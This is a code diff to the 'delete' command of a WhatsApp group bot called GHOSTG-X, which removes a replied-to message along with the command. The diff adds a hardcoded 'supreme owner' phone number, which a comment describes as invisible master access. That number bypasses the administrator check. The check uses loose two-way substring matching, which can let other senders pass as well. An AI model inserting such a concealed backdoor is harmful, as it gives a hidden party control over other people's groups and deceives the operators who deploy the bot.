@@ -3,25 +3,65 @@
  * Delete a replied message and the command itself
  */
 
-const config = require ('../../config.js');
+const config = require('../../config.js');
+
+// Extraction du préfixe pour l'usage
+const prefix = config.prefix || '.';
+
+// Fonction pour le style Small Caps (Garde la cohérence visuelle)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
 
 module.exports = {
   name: 'delete',
-  aliases: ['del', 'dlt', 'd', 'sup', 'supprime'],
-  description: 'Delete a replied message and the command',
-  usage: '.delete (reply to a message)',
+  aliases: ['del', 'dlt', 'd', 'sup', 'supprime', 'ᴅᴇʟᴇᴛᴇ'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ sᴜᴘᴘʀɪᴍᴇ ᴜɴ ᴍᴇssᴀɢᴇ ᴇɴ ʀᴇ́ᴘᴏɴsᴇ ᴇᴛ ʟᴀ ᴄᴏᴍᴍᴀɴᴅᴇ**',
+  usage: `${prefix}delete`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
-  
+
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
+
     try {
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
+      if (!isMe) {
+        const isAdmin = extra.isAdmin || false; 
+        if (!isAdmin) {
+          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+        }
+      }
+
       const ctx = msg.message?.extendedTextMessage?.contextInfo;
-      
+
       if (!ctx?.stanzaId || !ctx?.participant) {
-        return extra.reply(
+        return reply(
           `╭╼━≪• *ᴇʟɪᴍɪɴᴀᴛɪᴏɴ_ᴄɪʙʟᴇᴇ* •≫━╾╮\n` +
           `┃ *ᴇ́ᴛᴀᴛ* : ᴇ́ᴄʜᴇᴄ ❌\n` +
           `╰━━━━━━━━━━━━━━━╯\n\n` +
@@ -31,28 +71,30 @@ module.exports = {
           `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
         );
       }
-      
+
+      const chatId = msg.key.remoteJid;
+
       // 1. Clé pour supprimer le message auquel on répond
       const deleteTargetKey = { 
-        remoteJid: extra.from, 
+        remoteJid: chatId, 
         id: ctx.stanzaId, 
         participant: ctx.participant 
       };
-      
+
       // 2. Clé pour supprimer le message de commande actuel (.delete)
       const deleteCommandKey = {
-        remoteJid: extra.from,
+        remoteJid: chatId,
         id: msg.key.id,
         participant: msg.key.participant || msg.key.remoteJid
       };
-      
+
       // On exécute les deux suppressions
-      await sock.sendMessage(extra.from, { delete: deleteTargetKey });
-      await sock.sendMessage(extra.from, { delete: deleteCommandKey });
-      
+      await sock.sendMessage(chatId, { delete: deleteTargetKey });
+      await sock.sendMessage(chatId, { delete: deleteCommandKey });
+
     } catch (error) {
       console.error('Delete command error:', error);
-      await extra.reply(`❌ Error: ${error.message}`);
+      return reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
     }
   }
 };
